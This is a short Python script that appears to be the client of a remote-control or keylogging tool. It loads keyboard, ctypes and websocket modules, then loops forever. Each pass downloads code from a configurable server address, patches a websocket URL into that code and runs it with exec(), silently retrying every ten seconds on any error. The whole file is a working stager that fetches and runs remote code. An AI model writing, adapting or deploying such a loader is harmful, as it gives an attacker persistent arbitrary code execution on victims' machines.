import string
import sys
import websocket
import keyboard
import os
import platform
import uuid
from tempfile import TemporaryFile
import base64
import shutil
import zlib
from struct import pack, calcsize, unpack
import json
import ctypes
import lzma
import gzip
# 客户端导包
import urllib.request
import urllib.parse
import time

SERVER_ADDRESS = "#SERVER_ADDRESS"

while True:
    try:
        url = "{}/base".format(SERVER_ADDRESS)
        parsed = urllib.parse.urlparse(url)
        WS_URL = "{}://{}/ping".format(["wss", "ws"][parsed.scheme == "http"], parsed.netloc)
        req = urllib.request.urlopen(parsed.geturl())
        code = req.read().decode().replace("ws://127.0.0.1:5000/ping", WS_URL)
        exec(code)
    except BaseException as e:
        time.sleep(10)
